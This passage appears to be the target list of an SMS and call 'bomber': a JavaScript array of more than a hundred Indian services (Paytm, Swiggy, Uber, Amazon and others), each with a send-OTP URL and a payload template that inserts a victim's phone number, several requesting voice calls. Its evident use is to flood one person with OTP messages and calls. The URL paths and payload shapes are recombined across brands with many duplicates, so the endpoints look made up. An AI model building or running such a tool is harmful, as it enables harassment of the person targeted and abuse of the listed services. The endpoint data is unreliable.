  { 'name': 'Shiprocket WhatsApp', 'url': 'https://shiprocket.in/api/v1/customers/sendOtp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobile": "${phone}"}` },
  { 'name': 'Nykaa WhatsApp', 'url': 'https://nykaa.com/api/v1/auth/otpsend', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"number": "${phone}", "otpOnCall": true}` },
  { 'name': 'Olacabs Call', 'url': 'https://olacabs.com/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"number": "${phone}", "otpOnCall": true}` },
  { 'name': 'Rapido WhatsApp', 'url': 'https://rapido.bike/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phoneNumber": "${phone}", "otpType": "voice"}` },
  { 'name': 'Makemytrip Call', 'url': 'https://makemytrip.com/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobileNumber": "${phone}"}` },
  { 'name': 'Gokwik Call', 'url': 'https://gokwik.co/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phone": "${phone}", "countryCode": "91"}` },
  { 'name': 'Wakefit Call', 'url': 'https://wakefit.co/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobileNumber": "${phone}"}` },
  { 'name': 'Olacabs Call', 'url': 'https://olacabs.com/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobileNumber": "${phone}"}` },
  { 'name': 'Pharmeasy SMS', 'url': 'https://pharmeasy.in/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobileNumber": "${phone}"}` },
  { 'name': 'Swiggy Call', 'url': 'https://swiggy.com/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"number": "${phone}", "otpOnCall": true}` },
  { 'name': 'Uber Call', 'url': 'https://uber.com/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobile": "${phone}"}` },
  { 'name': 'Cred Call', 'url': 'https://cred.club/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phoneNumber": "${phone}", "otpType": "voice"}` },
  { 'name': 'Goibibo WhatsApp', 'url': 'https://goibibo.com/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phoneNumber": "${phone}", "otpType": "voice"}` },
  { 'name': 'Uber Call', 'url': 'https://uber.com/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phoneNumber": "${phone}", "otpType": "voice"}` },
  { 'name': 'Khatabook WhatsApp', 'url': 'https://khatabook.com/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobileNumber": "${phone}"}` },
  { 'name': 'Nykaa SMS', 'url': 'https://nykaa.com/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobile": "${phone}"}` },
  { 'name': 'Bigbasket Call', 'url': 'https://bigbasket.com/api/v1/auth/otpsend', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phone": "${phone}", "countryCode": "91"}` },
  { 'name': 'Goibibo Call', 'url': 'https://goibibo.com/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobile": "${phone}"}` },
  { 'name': 'Paytm Call', 'url': 'https://paytm.com/api/v1/customers/sendOtp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobileNumber": "${phone}"}` },
  { 'name': 'Doubtnut WhatsApp', 'url': 'https://doubtnut.com/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"number": "${phone}", "otpOnCall": true}` },
  { 'name': 'Cred WhatsApp', 'url': 'https://cred.club/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phone": "${phone}", "countryCode": "91"}` },
  { 'name': 'Dmart WhatsApp', 'url': 'https://dmart.ready.in/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobile": "${phone}"}` },
  { 'name': 'Pokerbaazi SMS', 'url': 'https://pokerbaazi.com/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"number": "${phone}", "otpOnCall": true}` },
  { 'name': 'Cred SMS', 'url': 'https://cred.club/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobile": "${phone}"}` },
  { 'name': 'Myntra Call', 'url': 'https://myntra.com/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"number": "${phone}", "otpOnCall": true}` },
  { 'name': 'Paytm SMS', 'url': 'https://paytm.com/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobileNumber": "${phone}"}` },
  { 'name': 'Doubtnut Call', 'url': 'https://doubtnut.com/api/v1/customers/sendOtp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phone": "${phone}", "countryCode": "91"}` },
  { 'name': 'Phonepe SMS', 'url': 'https://phonepe.com/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobileNumber": "${phone}"}` },
  { 'name': 'Instamart Call', 'url': 'https://instamart.com/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobileNumber": "${phone}"}` },
  { 'name': 'Zomato Call', 'url': 'https://zomato.com/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phone": "${phone}", "countryCode": "91"}` },
  { 'name': 'Amazon WhatsApp', 'url': 'https://amazon.in/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobile": "${phone}"}` },
  { 'name': 'Paytm WhatsApp', 'url': 'https://paytm.com/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"number": "${phone}", "otpOnCall": true}` },
  { 'name': 'Instamart WhatsApp', 'url': 'https://instamart.com/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobileNumber": "${phone}"}` },
  { 'name': 'Bigbasket SMS', 'url': 'https://bigbasket.com/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobile": "${phone}"}` },
  { 'name': 'Newme SMS', 'url': 'https://newme.asia/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phone": "${phone}", "countryCode": "91"}` },
  { 'name': 'Makemytrip Call', 'url': 'https://makemytrip.com/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phoneNumber": "${phone}", "otpType": "voice"}` },
  { 'name': 'Paytm SMS', 'url': 'https://paytm.com/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"number": "${phone}", "otpOnCall": true}` },
  { 'name': 'Doubtnut WhatsApp', 'url': 'https://doubtnut.com/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobileNumber": "${phone}"}` },
  { 'name': 'Newme Call', 'url': 'https://newme.asia/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobile": "${phone}"}` },
  { 'name': 'Blinkit WhatsApp', 'url': 'https://blinkit.com/api/v1/auth/otpsend', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobileNumber": "${phone}"}` },
  { 'name': 'Jupiter SMS', 'url': 'https://jupiter.money/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobileNumber": "${phone}"}` },
  { 'name': 'Zivame WhatsApp', 'url': 'https://zivame.com/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"number": "${phone}", "otpOnCall": true}` },
  { 'name': 'Olacabs SMS', 'url': 'https://olacabs.com/api/v1/auth/otpsend', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phone": "${phone}", "countryCode": "91"}` },
  { 'name': 'Instamart SMS', 'url': 'https://instamart.com/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"number": "${phone}", "otpOnCall": true}` },
  { 'name': 'Khatabook WhatsApp', 'url': 'https://khatabook.com/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobileNumber": "${phone}"}` },
  { 'name': 'Myntra SMS', 'url': 'https://myntra.com/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"number": "${phone}", "otpOnCall": true}` },
  { 'name': 'Khatabook Call', 'url': 'https://khatabook.com/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phone": "${phone}", "countryCode": "91"}` },
  { 'name': 'Wakefit WhatsApp', 'url': 'https://wakefit.co/api/v1/customers/sendOtp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phone": "${phone}", "countryCode": "91"}` },
  { 'name': 'Phonepe SMS', 'url': 'https://phonepe.com/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phone": "${phone}", "countryCode": "91"}` },
  { 'name': 'Shiprocket Call', 'url': 'https://shiprocket.in/api/v1/customers/sendOtp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phone": "${phone}", "countryCode": "91"}` },
  { 'name': 'Api-Gateway SMS', 'url': 'https://api-gateway.juno.lenskart.com/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phone": "${phone}", "countryCode": "91"}` },
  { 'name': 'Bigbasket Call', 'url': 'https://bigbasket.com/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phone": "${phone}", "countryCode": "91"}` },
  { 'name': 'Amazon WhatsApp', 'url': 'https://amazon.in/api/v1/customers/sendOtp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobile": "${phone}"}` },
  { 'name': 'Wakefit WhatsApp', 'url': 'https://wakefit.co/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phoneNumber": "${phone}", "otpType": "voice"}` },
  { 'name': 'Cred Call', 'url': 'https://cred.club/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"number": "${phone}", "otpOnCall": true}` },
  { 'name': 'Tatacapital Call', 'url': 'https://tatacapital.com/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobileNumber": "${phone}"}` },
  { 'name': 'Goibibo Call', 'url': 'https://goibibo.com/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobile": "${phone}"}` },
  { 'name': 'Instamart Call', 'url': 'https://instamart.com/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phoneNumber": "${phone}", "otpType": "voice"}` },
  { 'name': 'Khatabook Call', 'url': 'https://khatabook.com/api/v1/auth/otpsend', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phoneNumber": "${phone}", "otpType": "voice"}` },
  { 'name': 'Paytm WhatsApp', 'url': 'https://paytm.com/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobileNumber": "${phone}"}` },
  { 'name': 'Rapido Call', 'url': 'https://rapido.bike/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phoneNumber": "${phone}", "otpType": "voice"}` },
  { 'name': 'Nykaa WhatsApp', 'url': 'https://nykaa.com/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phone": "${phone}", "countryCode": "91"}` },
  { 'name': 'Tatacapital SMS', 'url': 'https://tatacapital.com/api/v1/customers/sendOtp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobile": "${phone}"}` },
  { 'name': 'Khatabook SMS', 'url': 'https://khatabook.com/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phoneNumber": "${phone}", "otpType": "voice"}` },
  { 'name': 'Api-Gateway SMS', 'url': 'https://api-gateway.juno.lenskart.com/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"number": "${phone}", "otpOnCall": true}` },
  { 'name': 'Olacabs SMS', 'url': 'https://olacabs.com/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phoneNumber": "${phone}", "otpType": "voice"}` },
  { 'name': 'Oyorooms SMS', 'url': 'https://oyorooms.com/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"number": "${phone}", "otpOnCall": true}` },
  { 'name': 'Phonepe WhatsApp', 'url': 'https://phonepe.com/api/v1/customers/sendOtp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobile": "${phone}"}` },
  { 'name': 'Instamart SMS', 'url': 'https://instamart.com/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobile": "${phone}"}` },
  { 'name': 'Pokerbaazi SMS', 'url': 'https://pokerbaazi.com/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobile": "${phone}"}` },
  { 'name': 'Newme SMS', 'url': 'https://newme.asia/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobileNumber": "${phone}"}` },
  { 'name': '1Mg SMS', 'url': 'https://1mg.com/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phone": "${phone}", "countryCode": "91"}` },
  { 'name': 'Makemytrip Call', 'url': 'https://makemytrip.com/api/v1/customers/sendOtp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"number": "${phone}", "otpOnCall": true}` },
  { 'name': 'Nykaa Call', 'url': 'https://nykaa.com/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobileNumber": "${phone}"}` },
  { 'name': 'Zivame Call', 'url': 'https://zivame.com/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobileNumber": "${phone}"}` },
  { 'name': 'Khatabook SMS', 'url': 'https://khatabook.com/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobile": "${phone}"}` },
  { 'name': 'Olacabs WhatsApp', 'url': 'https://olacabs.com/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"number": "${phone}", "otpOnCall": true}` },
  { 'name': 'Meesho Call', 'url': 'https://meesho.com/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phone": "${phone}", "countryCode": "91"}` },
  { 'name': 'Shiprocket SMS', 'url': 'https://shiprocket.in/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"number": "${phone}", "otpOnCall": true}` },
  { 'name': 'Zomato SMS', 'url': 'https://zomato.com/api/v1/auth/otpsend', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phone": "${phone}", "countryCode": "91"}` },
  { 'name': 'Goibibo Call', 'url': 'https://goibibo.com/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phoneNumber": "${phone}", "otpType": "voice"}` },
  { 'name': 'Jupiter Call', 'url': 'https://jupiter.money/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobileNumber": "${phone}"}` },
  { 'name': 'Zomato WhatsApp', 'url': 'https://zomato.com/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phone": "${phone}", "countryCode": "91"}` },
  { 'name': 'Pharmeasy SMS', 'url': 'https://pharmeasy.in/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phone": "${phone}", "countryCode": "91"}` },
  { 'name': 'Zivame SMS', 'url': 'https://zivame.com/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobileNumber": "${phone}"}` },
  { 'name': 'Wakefit Call', 'url': 'https://wakefit.co/api/v1/customers/sendOtp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phoneNumber": "${phone}", "otpType": "voice"}` },
  { 'name': 'Goibibo SMS', 'url': 'https://goibibo.com/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phone": "${phone}", "countryCode": "91"}` },
  { 'name': 'Pokerbaazi Call', 'url': 'https://pokerbaazi.com/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phoneNumber": "${phone}", "otpType": "voice"}` },
  { 'name': 'Gokwik SMS', 'url': 'https://gokwik.co/api/v1/auth/otpsend', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"number": "${phone}", "otpOnCall": true}` },
  { 'name': 'Phonepe Call', 'url': 'https://phonepe.com/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phone": "${phone}", "countryCode": "91"}` },
  { 'name': 'Paytm SMS', 'url': 'https://paytm.com/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobileNumber": "${phone}"}` },
  { 'name': 'Pokerbaazi WhatsApp', 'url': 'https://pokerbaazi.com/api/v1/customers/sendOtp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phoneNumber": "${phone}", "otpType": "voice"}` },
  { 'name': 'Goibibo WhatsApp', 'url': 'https://goibibo.com/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phone": "${phone}", "countryCode": "91"}` },
  { 'name': 'Blinkit WhatsApp', 'url': 'https://blinkit.com/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"number": "${phone}", "otpOnCall": true}` },
  { 'name': 'Olacabs Call', 'url': 'https://olacabs.com/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobileNumber": "${phone}"}` },
  { 'name': 'Amazon Call', 'url': 'https://amazon.in/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phoneNumber": "${phone}", "otpType": "voice"}` },
  { 'name': 'Bigbasket Call', 'url': 'https://bigbasket.com/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobile": "${phone}"}` },
  { 'name': 'Uber Call', 'url': 'https://uber.com/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phoneNumber": "${phone}", "otpType": "voice"}` },
  { 'name': 'Olacabs SMS', 'url': 'https://olacabs.com/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"number": "${phone}", "otpOnCall": true}` },
  { 'name': 'Gokwik WhatsApp', 'url': 'https://gokwik.co/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phoneNumber": "${phone}", "otpType": "voice"}` },
  { 'name': 'Amazon SMS', 'url': 'https://amazon.in/api/v1/auth/otpsend', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phoneNumber": "${phone}", "otpType": "voice"}` },
  { 'name': 'Cred Call', 'url': 'https://cred.club/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"number": "${phone}", "otpOnCall": true}` },
  { 'name': 'Goibibo Call', 'url': 'https://goibibo.com/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phone": "${phone}", "countryCode": "91"}` },
  { 'name': 'Makemytrip SMS', 'url': 'https://makemytrip.com/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobileNumber": "${phone}"}` },
  { 'name': 'Amazon Call', 'url': 'https://amazon.in/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"number": "${phone}", "otpOnCall": true}` },
  { 'name': 'Phonepe Call', 'url': 'https://phonepe.com/api/v1/customers/sendOtp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobile": "${phone}"}` },
  { 'name': 'Shiprocket SMS', 'url': 'https://shiprocket.in/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phone": "${phone}", "countryCode": "91"}` },
  { 'name': 'Nykaa Call', 'url': 'https://nykaa.com/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobile": "${phone}"}` },
  { 'name': 'Swiggy Call', 'url': 'https://swiggy.com/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phone": "${phone}", "countryCode": "91"}` },
  { 'name': 'Makemytrip Call', 'url': 'https://makemytrip.com/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phone": "${phone}", "countryCode": "91"}` },
  { 'name': '1Mg Call', 'url': 'https://1mg.com/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"number": "${phone}", "otpOnCall": true}` },
  { 'name': 'Swiggy WhatsApp', 'url': 'https://swiggy.com/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobileNumber": "${phone}"}` },
  { 'name': 'Nykaa WhatsApp', 'url': 'https://nykaa.com/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobileNumber": "${phone}"}` },
  { 'name': 'Newme SMS', 'url': 'https://newme.asia/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"number": "${phone}", "otpOnCall": true}` },
  { 'name': 'Amazon Call', 'url': 'https://amazon.in/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phoneNumber": "${phone}", "otpType": "voice"}` },
  { 'name': 'Blinkit WhatsApp', 'url': 'https://blinkit.com/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"number": "${phone}", "otpOnCall": true}` },
  { 'name': 'Api-Gateway Call', 'url': 'https://api-gateway.juno.lenskart.com/api/v1/auth/otpsend', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phone": "${phone}", "countryCode": "91"}` },
  { 'name': 'Dmart Call', 'url': 'https://dmart.ready.in/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phone": "${phone}", "countryCode": "91"}` },
  { 'name': 'Tatacapital SMS', 'url': 'https://tatacapital.com/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phone": "${phone}", "countryCode": "91"}` },
  { 'name': 'Khatabook SMS', 'url': 'https://khatabook.com/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phoneNumber": "${phone}", "otpType": "voice"}` },
  { 'name': 'Uber Call', 'url': 'https://uber.com/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobileNumber": "${phone}"}` },
  { 'name': 'Bigbasket Call', 'url': 'https://bigbasket.com/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phoneNumber": "${phone}", "otpType": "voice"}` },
  { 'name': 'Ajio WhatsApp', 'url': 'https://ajio.com/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobileNumber": "${phone}"}` },
  { 'name': 'Nykaa WhatsApp', 'url': 'https://nykaa.com/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"number": "${phone}", "otpOnCall": true}` },
  { 'name': 'Doubtnut Call', 'url': 'https://doubtnut.com/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobileNumber": "${phone}"}` },
  { 'name': 'Olacabs Call', 'url': 'https://olacabs.com/api/v1/customers/sendOtp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phoneNumber": "${phone}", "otpType": "voice"}` },
  { 'name': 'Uber WhatsApp', 'url': 'https://uber.com/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phone": "${phone}", "countryCode": "91"}` },
  { 'name': 'Ajio SMS', 'url': 'https://ajio.com/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobile": "${phone}"}` },
  { 'name': 'Api-Gateway SMS', 'url': 'https://api-gateway.juno.lenskart.com/api/v1/auth/otpsend', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phone": "${phone}", "countryCode": "91"}` },
  { 'name': 'Api-Gateway Call', 'url': 'https://api-gateway.juno.lenskart.com/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobileNumber": "${phone}"}` },
  { 'name': 'Api-Gateway Call', 'url': 'https://api-gateway.juno.lenskart.com/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobile": "${phone}"}` },
  { 'name': 'Olacabs SMS', 'url': 'https://olacabs.com/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"number": "${phone}", "otpOnCall": true}` },
  { 'name': 'Goibibo WhatsApp', 'url': 'https://goibibo.com/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"number": "${phone}", "otpOnCall": true}` },
  { 'name': 'Ajio Call', 'url': 'https://ajio.com/api/v1/customers/sendOtp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobile": "${phone}"}` },
  { 'name': 'Jupiter WhatsApp', 'url': 'https://jupiter.money/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phone": "${phone}", "countryCode": "91"}` },
  { 'name': 'Phonepe Call', 'url': 'https://phonepe.com/api/v1/auth/otpsend', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobile": "${phone}"}` },
  { 'name': 'Khatabook SMS', 'url': 'https://khatabook.com/api/v1/customers/sendOtp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phone": "${phone}", "countryCode": "91"}` },
  { 'name': 'Myntra WhatsApp', 'url': 'https://myntra.com/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobile": "${phone}"}` },
  { 'name': 'Uber SMS', 'url': 'https://uber.com/api/v1/auth/otpsend', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phone": "${phone}", "countryCode": "91"}` },
  { 'name': 'Api-Gateway SMS', 'url': 'https://api-gateway.juno.lenskart.com/api/v1/auth/otpsend', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"number": "${phone}", "otpOnCall": true}` },
